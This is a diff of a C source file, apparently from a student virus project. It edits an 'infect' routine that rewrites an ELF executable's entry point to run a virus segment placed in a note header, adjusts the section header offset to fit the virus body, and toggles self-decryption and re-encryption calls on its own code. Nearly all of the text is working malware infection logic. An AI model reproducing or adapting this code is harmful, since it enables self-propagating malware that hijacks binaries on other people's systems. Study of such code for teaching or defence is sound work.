@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:22:03 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/09 14:46:58 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/10 20:09:33 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -17,11 +17,11 @@
 */
 void		infect(t_data *data)
 {
-	revert_two(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
+	/* revert_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect); */
 
 #ifdef DEBUG
-	char de[] = "infect\t0\n";
-	data->context == true ?	de[7] = 49 : 0;
+	char de[] = "infect\t\t0\n";
+	data->context == true ?	de[8] = 49 : 0;
 	_log(de, _strlen(de));
 #endif
 
@@ -62,10 +62,14 @@ void		infect(t_data *data)
 	data->vrs_entry = data->virus.note->p_vaddr;
 	data->header->e_entry = data->vrs_entry;
 	data->header->e_shoff += data->virus.size + (data->virus.note->p_offset - (data->virus.data->p_offset + data->virus.data->p_filesz));
+
+	/* data->header->e_shoff = 0; */
+	/* data->header->e_shnum = 0; */
+	/* data->header->e_shstrndx = 0; */
 	data->context = true;
 
 next:
-	update_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
-	revert_two(&data->key, (char*)inject, (size_t)patch - (size_t)inject);
+	/* update_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect); */
+	/* revert_one(&data->key, (char*)inject, (size_t)patch - (size_t)inject); */
 	inject(data);
 }
